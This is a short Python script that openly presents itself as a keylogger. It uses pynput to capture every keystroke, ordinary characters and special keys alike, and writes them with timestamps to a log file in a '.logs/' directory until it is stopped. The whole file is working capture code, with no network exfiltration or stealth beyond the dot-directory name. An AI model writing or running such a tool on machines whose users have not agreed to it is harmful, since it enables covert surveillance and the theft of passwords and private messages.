from pynput import keyboard
import logging
from datetime import datetime

# ====== LOGGING CONFIG ======
log_dir = ".logs/"
log_file = f"{log_dir}keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# ====== ON PRESS EVENT ======
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

# ====== MAIN LOOP ======
with keyboard.Listener(on_press=on_press) as listener:
    print(f"⌨️ Keylogger started. Logging to {log_file}... (Ctrl+C to stop)")
    listener.join()
